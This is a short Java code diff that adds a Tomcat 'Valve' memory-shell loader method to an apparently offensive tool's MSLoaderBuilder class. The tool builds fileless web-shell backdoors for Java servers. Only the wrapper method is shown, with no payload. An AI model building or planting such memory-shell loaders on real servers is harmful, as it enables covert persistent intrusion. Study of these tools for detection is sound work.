@@ -119,6 +119,12 @@ public class MSLoaderBuilder {
         return defaultLoader(cls, MSGzipBase64, javaClassHelper);
     }
 
+    @Middleware(Middleware.Tomcat)
+    @MemShell(MemShell.Valve)
+    public byte[] tomcatValve(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultLoader(cls, MSGzipBase64, javaClassHelper);
+    }
+
 
     /**
      * Spring
